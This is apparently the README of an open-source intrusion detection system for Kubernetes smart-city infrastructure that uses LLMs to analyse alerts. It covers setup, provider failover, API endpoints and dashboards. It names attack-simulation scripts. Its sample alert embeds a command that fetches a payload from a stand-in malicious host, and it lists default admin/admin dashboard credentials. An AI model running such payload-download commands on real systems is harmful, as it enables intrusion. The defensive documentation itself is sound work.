# Smart City IDS — Complete Documentation

## 🏙️ Overview
A production-ready, LLM-powered Intrusion Detection System for Kubernetes-based smart city infrastructure. Features:
- Multi-provider LLM threat analysis with automatic failover
- Automated Kubernetes response (pod isolation, scaling, IP blocking)
- Human-in-the-loop governance
- Real-time metrics and dashboards (Prometheus + Grafana)
- Modular, extensible, and open-source

---

## 🚀 Quick Start

### 1. Clone & Setup
```bash
git clone https://github.com/yourusername/smart-city-ids.git
cd smart-city-ids
```

### 2. Set LLM API Key(s)
You only need **one** key. The system auto-discovers all available providers.
```bash
export GEMINI_API_KEY="AIza..."      # Google Gemini (free tier)
# or
export OPENAI_API_KEY="sk-..."      # OpenAI
# or
export XAI_API_KEY="xai-..."        # xAI Grok
# or
export ANTHROPIC_API_KEY="sk-ant-..." # Anthropic Claude
# or
export KIMI_API_KEY="sk-..."        # Moonshot Kimi
```
For production, set multiple keys for failover:
```bash
export XAI_API_KEY="xai-..."
export GEMINI_API_KEY="AIza..."
export LLM_PRIORITY="xai,gemini,openai"
```

### 3. Deploy
```bash
sudo ./scripts/start-everything.sh
kubectl get pods -n smart-city -w
```

### 4. Access Services
- **IDS API:** http://localhost:8000
- **Grafana:** http://localhost:3000 (admin/admin)
- **Prometheus:** http://localhost:9090

---

## 🧠 LLM Provider System & Failover
- Set one or more API keys as environment variables.
- The system auto-discovers all available providers at startup.
- When analyzing an alert, it tries providers in priority order (`LLM_PRIORITY`).
- If a provider fails (expired key, quota, network), the next is tried automatically.
- No special config needed—failover is always on.

**To add a new provider:**
1. Implement a class in `services/ids-api/src/llm_providers/providers.py` using `@ProviderRegistry.register("yourname")`.
2. Set the required env var (e.g., `YOURNAME_API_KEY`).
3. The system will auto-detect and use your provider.

---

## 🏗️ Architecture
```
IoT Devices → Falco/Suricata → IDS API → LLM Manager → K8s Automation
                                      ↓
                                PostgreSQL
                                      ↓
                                Prometheus
                                      ↓
                                 Grafana
```
- **Falco/Suricata:** Detect suspicious activity
- **IDS API:** Ingests alerts, deduplicates, analyzes with LLMs, automates K8s
- **LLM Manager:** Tries providers in order, with circuit breaker failover
- **Prometheus/Grafana:** Metrics and dashboards

---

## ⚙️ API Reference

### Core Endpoints
| Method | Endpoint                | Description                |
|--------|-------------------------|----------------------------|
| GET    | `/health`               | Health check               |
| POST   | `/api/alerts`           | Submit security alert      |
| GET    | `/api/alerts`           | Get recent alerts          |
| GET    | `/api/metrics`          | JSON metrics               |
| GET    | `/metrics`              | Prometheus metrics         |
| GET    | `/api/llm/status`       | LLM provider status        |
| GET    | `/api/circuit-breaker/status` | Circuit breaker states |
| POST   | `/api/circuit-breaker/reset`  | Reset all breakers     |

### Example: Send an Alert
```bash
curl -X POST http://localhost:8000/api/alerts \
  -H "Content-Type: application/json" \
  -d '{
    "output": "Suspicious process execution detected",
    "priority": "Critical",
    "rule": "Unauthorized Process",
    "time": "2025-02-05T10:00:00Z",
    "output_fields": {
      "container.name": "traffic-camera-001",
      "proc.cmdline": "/bin/bash -c wget http://malicious.site/payload"
    }
  }'
```

### Example: Check LLM Status
```bash
curl http://localhost:8000/api/llm/status | jq
```

---

## 📊 Grafana Dashboards
- Pre-built dashboards for alert rates, severity, deduplication, LLM status, and more.
- To customize: edit `k8s-manifests/grafana-provisioning-dashboards.yaml` and reload Grafana.
- Add panels for:
  - Alerts received vs processed
  - Severity distribution
  - LLM provider/circuit status
  - False positive rate

---

## 🧪 Testing & Attack Simulation

### Run All Tests
```bash
pip install pytest pytest-cov
pytest tests/ -v
```

### Simulate Attacks
```bash
python attack-simulator/ddos_simulator.py http://localhost:8080 10 30
python attack-simulator/phase4-smart-city-attacks.py
```

---

## 🛠️ Project Structure
```
smart-city-ids/
├── services/
│   ├── ids-api/src/           # Main IDS API
│   │   ├── main.py            # FastAPI application
│   │   ├── llm_providers/     # Generic LLM provider system
│   │   ├── k8s_automation.py  # K8s actions
│   │   ├── database.py        # PostgreSQL
│   │   ├── governance.py      # Human-in-the-loop
│   │   ├── alert_rate_limiter.py  # Rate limiting
│   │   └── operator_interface.py  # Operator UI
│   └── forwarders/            # Alert forwarders
├── k8s-manifests/             # Kubernetes manifests
├── scripts/                   # Deployment scripts
├── attack-simulator/          # Attack tools
├── tests/                     # Unit tests
└── docs/                      # Documentation
```

---

## 🤝 Contributing & Extending
- Fork the repo, create a feature branch, submit PRs.
- To add a new LLM provider, see `services/ids-api/src/llm_providers/README.md`.
- To add new dashboards, edit the Grafana provisioning YAML.
- All code is MIT licensed.

---

## 📚 Further Reading
- [docs/LLM_CONFIGURATION.md](docs/LLM_CONFIGURATION.md) — Full LLM setup guide
- [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) — System architecture
- [docs/API_REFERENCE.md](docs/API_REFERENCE.md) — Full API docs
- [docs/TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md) — Common issues

---

**Built for Smart City Security — Reliable, Extensible, Open**
